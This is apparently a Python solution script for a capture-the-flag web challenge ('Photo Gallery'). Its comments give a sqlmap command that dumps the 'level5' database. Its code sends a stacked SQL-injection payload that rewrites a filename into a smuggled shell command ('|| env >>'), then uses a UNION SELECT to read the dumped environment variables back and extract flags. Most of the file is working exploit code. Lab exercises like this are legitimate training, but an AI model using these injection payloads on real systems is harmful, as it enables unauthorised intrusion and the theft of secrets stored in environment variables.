# Run with
# poetry run python main.py <url>

# This challenge has a small website which is pulling some image files from a
# database. Upon initial inspection the /fetch?id=x pattern looks interesting.
# Passing that to sqlmap.py, it reports that the param has timed sql injection
# vulnerability.
# Running the following command gives the database structure and dumps the
# content of the database 'level5'.
#
#
# ./sqlmap.py -u '<url>/fetch?id=1' -p "id" --dbms=mysql --dump -D level5 -T photos --threads=10
#
#
# (To get the dbname run the sqlmap command with flags '--tables --columns
# --schema'.)
#
# This should show the content of the tables present in database level5.
# Using this, the id=3 is interesting and the filename column. Looks like the
# app is pulling files from the filename. Since the 'id' is vulnerable, we
# inject and update id 3 with new filename which is a bad command and then
# printing the env vars in a file. And then the file is pulled using the
# `id=x;UNION SELECT '<filename>'--` pattern.
# Also, we can print the app which happens to be a python Flask app by pulling
# the main.py file using the above pattern.
from __future__ import annotations

import argparse
import requests
import re

from requests import Session, Response
from argparse import ArgumentParser, Namespace
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from typing import Any, Iterable

filename = "hacked.txt"
pattern = r"(\^FLAG\^.*?\$FLAG\$)"


def find_flags(s: str) -> Iterable[str]:
    v: list[Any] = re.findall(pattern, s)

    return set(v)


def parser() -> argparse.Namespace:
    p: ArgumentParser = argparse.ArgumentParser(
        description="Script to get flags for Photo Gallery challenge",
    )
    p.add_argument("url", metavar="url", help="challenge url")

    return p.parse_args()


def inject_shell_exploit(s: Session, url: str) -> None:
    payload: str = f"/fetch?id=2;UPDATE photos SET filename='notfound || env >> {filename}' WHERE id=3;commit--"

    url_: str = url.strip("/") + payload

    response: Response = s.get(url_)
    response.raise_for_status()


def get_all_flags(s: Session, url: str) -> Iterable[str]:
    payload: str = f"/fetch?id=4 UNION SELECT '{filename}'--"
    url_: str = url.strip("/") + payload

    # Call the home page to refresh the website, such that id=3 is called
    # and the RCE is executed.
    response: Response = s.get(url_)
    response.raise_for_status()

    text: str = response.text
    return find_flags(text)


def main(url: str) -> None:
    s: Session = requests.Session()

    inject_shell_exploit(s, url)

    r: Response = s.get(url)
    r.raise_for_status()

    f: Iterable[str] = get_all_flags(s, url)
    [print(v) for v in f]


if __name__ == "__main__":
    args: Namespace = parser()
    main(args.url)
